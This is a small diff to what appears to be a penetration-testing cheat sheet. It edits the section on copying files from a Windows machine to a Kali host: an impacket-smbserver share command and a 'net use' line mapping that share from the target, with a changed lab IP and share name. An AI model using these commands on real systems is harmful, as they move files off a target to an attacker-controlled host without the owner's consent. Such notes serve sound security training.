@@ -434,10 +434,10 @@ ssh username@target_ip #enter password if you gave any
 - Windows when you have GUI access on windows and need to get a file from windows to kali
 ```
 # On Kali
-impacket-smbserver <projectName> . -smb2support  -username kali -password kali
+impacket-smbserver tmp . -smb2support  -username kali -password kali
 
 # On Windows
-net use m: \\192.168.45.181\medtech /user:kali kali 
+net use m: \\192.168.45.216\tmp /user:kali kali 
 copy <file.extension> m:\
 ```
 
